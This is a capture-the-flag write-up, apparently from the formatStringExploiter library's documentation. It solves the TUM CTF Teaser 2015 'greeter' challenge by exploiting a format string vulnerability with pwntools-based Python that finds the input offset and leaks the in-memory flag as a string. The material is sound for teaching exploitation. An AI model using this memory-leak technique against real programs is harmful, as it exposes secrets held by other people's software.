############################
TUM CTF Teaser 2015: greeter
############################

********
Overview
********
Another example of a basic format string vulnerability. In this case, the flag
was read into memory and your input was printf'd back at you. The goal being to
use that printf to read the flag from memory. 

Example::

  $ ./greeter
  Hi, what's your name?
  %x  
  Pwn harder, 8d74e440!


*****************
The Vulnerability
*****************
As previously mentioned, we have a format string vulnerability, and we know
that the flag was read into memory prior to our format string being executed.
The easy method is to simply print it out as a string.


****************
Step 1: exec_fmt 
****************
The first step in using the ``FormatString`` class is to create an exec_fmt
function. This function will take in any arbitrary input, pass that input into
the application properly, parse the results and return the results back. At
this point, we're not worried about exploiting the vulnerability, we're simply
interacting with the program.

.. code-block:: python

  def exec_fmt(s):
      p = process(fName,bufSize=0xffff)
      p.sendline(s)
      p.recvuntil("Pwn harder, ",drop=True)
      return p.recvall()


That'll do. That's the majority of your work right there.


*************************
Step 2: Instantiate Class
*************************
Next, we need to instantiate a FormatString class. This can be done strait
forward. To make it simpler, we'll also open an ``ELF`` class on the exe.

.. code-block:: python

  from formatStringExploiter.FormatString import FormatString
  from pwn import *
  
  # Load the binary in pwntools. This way we don't need to worry about the
  # details, just pass it to FormatString
  elf = ELF("./greeter")
  
  # Now, instantiate a FormatString class, using the elf and exec_fmt functions
  fmtStr = FormatString(exec_fmt,elf=elf)

You will see some data scroll. This is the FormatString class attempting to
discover your buffer for you. Finally, you'll see something like this::

  Found the offset to our input! Index = 6, Pad = 0

Good to go now. It has found the buffer, we can simply ask the class to perform
actions for us now.

***************************
Step 3: Read Flag As String
***************************
Now that it's all set up, simply ask ``FormatString`` to give you this variable
as a string.

.. code-block:: python

  fmtStr.leak.s(elf.symbols['flag'])

That's it. Your flag is printed. If this were the CTF, you could change
``process`` to ``remote`` and run it again to grab the flag.

*********
Resources
*********
* `greeter <https://github.com/ctfs/write-ups-2015/blob/9b3c290275718ff843c409842d738e6ef3e565fd/tum-ctf-teaser-2015/pwn/greeter/greeter?raw=true>`_
* `greeter.py <https://raw.githubusercontent.com/Owlz/formatStringExploiter/master/docs/examples/greeter.py>`_
* `greeter github <https://github.com/ctfs/write-ups-2015/tree/9b3c290275718ff843c409842d738e6ef3e565fd/tum-ctf-teaser-2015/pwn/greeter>`_
